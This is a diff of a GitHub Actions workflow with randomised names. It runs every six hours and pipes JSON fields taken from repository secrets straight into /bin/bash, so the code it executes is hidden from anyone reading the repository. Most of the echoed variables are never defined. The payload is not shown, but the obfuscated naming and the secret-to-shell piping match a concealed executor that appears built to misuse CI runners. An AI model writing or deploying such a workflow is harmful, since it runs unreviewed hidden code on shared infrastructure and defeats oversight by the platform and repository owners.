@@ -2,20 +2,21 @@ name: juededy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 4/6 * * *'
+    - cron: '36 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: juededy
         env:
-          h3: ${{ secrets.h3 }}
+          edhnx0966: ${{ secrets.edhnx0966 }}
         run: |
-          echo $h3 | jq -r .znibo7129 | /bin/bash
-          echo $eunkq99 | jq -r .nyram57210 | /bin/bash
-          echo $frie89 | jq -r .vt84 | /bin/bash
-          echo $b925 | jq -r .plvfb48 | /bin/bash
-          echo $qnnae6004 | jq -r .ma5711 | /bin/bash
-          echo $yc588 | jq -r .ensqx77 | /bin/bash
+          echo $edhnx0966 | jq -r .dvm6769 | /bin/bash
+          echo $axakl22 | jq -r .rc91576 | /bin/bash
+          echo $sh1253 | jq -r .et35927 | /bin/bash
+          echo $enpwn4 | jq -r .zsvt08 | /bin/bash
+          echo $sputc660 | jq -r .mc59 | /bin/bash
+          echo $lhnn17 | jq -r .zyyv542 | /bin/bash
 
